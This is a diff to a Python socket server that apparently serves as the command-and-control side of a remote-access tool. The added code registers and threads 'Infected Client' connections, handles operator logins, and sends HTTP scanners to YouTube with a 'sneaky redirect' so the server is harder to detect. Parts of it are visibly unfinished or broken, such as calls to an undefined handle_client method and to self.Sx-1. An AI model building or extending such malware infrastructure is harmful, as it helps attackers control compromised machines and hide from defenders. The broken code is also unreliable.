@@ -47,6 +47,9 @@ class ServerSockHandler:
         self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"
 
         self.SxXX = "Unkown error: "
+
+        ## Other Values
+        self.http_redirect = "https://youtube.com"
     def socket_cleanup(self):
         #pass
         try:
@@ -63,7 +66,7 @@ class ServerSockHandler:
         and then delegates/sorts them based on the clients response
         """
 
-    ##== Initial Connection
+    ##== Initial Connection (these are server values, NOT client values)
         try:
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             # this allows the socket to be reelased immediatly on crash/exit
@@ -119,18 +122,20 @@ class ServerSockHandler:
             logging.debug(f"Parsed response from {self.client_remote_ip_port}: {response_list}")
 
             try:
-                self.id = response_list[0]
-                self.message = response_list[1]
+                self.client_type = response_list[0]
+                self.id = response_list[1]
+                self.message = response_list[2]
                 logging.debug(f"Client Established: {self.client_remote_ip_port} id={self.id}")
 
             except:
                 ## Not setting self.id as it's first in the list, and SHOULD alwys have a value
                 ## however an empty request may fool it
                 self.message = "None"
-                logging.debug(f"No message value was recieved. id={self.id} message={self.message}")
+                self.id = "None"
+                logging.debug(f"No message, or ID value was recieved. response_list={response_list}")
 
             ## == Decisions based on parsed messages
-            if self.id == "!_userlogin_!":
+            if self.client_type == "!_userlogin_!":
                 username, password = self.message.split("//|\\\\")
 
                 if self.password_eval(password):
@@ -162,7 +167,82 @@ class ServerSockHandler:
                     except Exception as e:
                         logging.warning(f"{self.Sx-1}:{e}")
                 else:
+                    self.conn.send(str_encode("1"))
                     logging.critical(f"Failed logon  from {username}, {self.client_remote_ip_port}")
+##====================================== Construction ===========
+            elif self.client_type == "!_client_!":
+                logging.debug(f"Message from Infected Client {self.id} recieved")
+
+                ## peername[0] is ip, [1] is port
+                ## Might want to rethink this as it may reach out to cleint again.
+                ## or jsut create a self.ip and self.port
+                client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id
+
+                if client_name not in self.current_clients:
+                    self.current_clients.append(client_name)
+                    ## creating object intance
+                    self.client = ServerFriendlyClientHandler()
+                    # adding the instance self.client to the self.clients dict
+                    self.clients[client_name] = self.client
+                    globals()[client_name] = self.client
+                
+                ## creating thread for this communication
+                thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
+                thread.start() 
+##====================================== Construction ^^^^ ===========
+               
+
+            if any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
+                ## I should capture these too and see whos hitting it
+                #self.conn.send(str_encode("<p1>403 Forbidden</p1>"))
+                ## Sneaky redirect to youtube 
+                self.conn.send(str_encode(f'<meta http-equiv = "refresh" content = "0; url = {self.http_redirect}" />test</meta>'))
+                logging.debug("Recieved HTTP Request... redirecting to webpage")
+            else:
+                logging.critical(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {response_list} ")
+
+################
+## Friendly client
+################ 
+class ServerFriendlyClientHandler:
+    """
+    Desc:  This class is called on a per friendly client basis, and handles/stores all the data needed
+    for each respective client.
+    """
+    def __init__(self):
+        ## Init variables so error messages don't error out if called b4 they are assigned :)
+        self.conn = None
+        self.add = None
+        self.ip = None
+        self.port = None
+
+        self.Sx21 = f"[Friendly Client: {self.ip}:{self.port}] conn_broken_pipe: A pipe was broken f"
+
+    
+    def friendly_client_communication(self, conn, addr, message, username):
+        """
+        Note: Arguments are passed here instead of the __init__ to save a line in ServerSockHandler,
+        plus it's less complicated to my head
+        """
+        self.conn = conn
+        self.addr = addr
+        self.ip = addr[0]
+        self.port = addr[1]
+        logging.debug(f"Friendly Client authenticated, user={username}")
+
+        while True:
+            raw_user_input = bytes_decode(self.conn.recv(1024))
+            user_input = self.parse_msg_for_server(raw_user_input)         
+
+            try:
+                user_username = user_input[0]
+                user_command= user_input[1]
+                self.server_decision_tree(user_command)
+
+            except:
+                logging.debug(f"Error with username or command, input={raw_user_input}")
+
+            
 
 ################
 ## Client Fucntions
@@ -186,6 +266,11 @@ class ServerSockHandler:
 ################
 ## QOL Functions
 ################
+"""
+Desc: A custom encode/decoder for things, with a format try/except block built in.
+Some clients send odd characters sometimes so this is a failsafe
+"""
+
 ## str -> bytes
 def str_encode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) -> bytes:
     for format in formats:
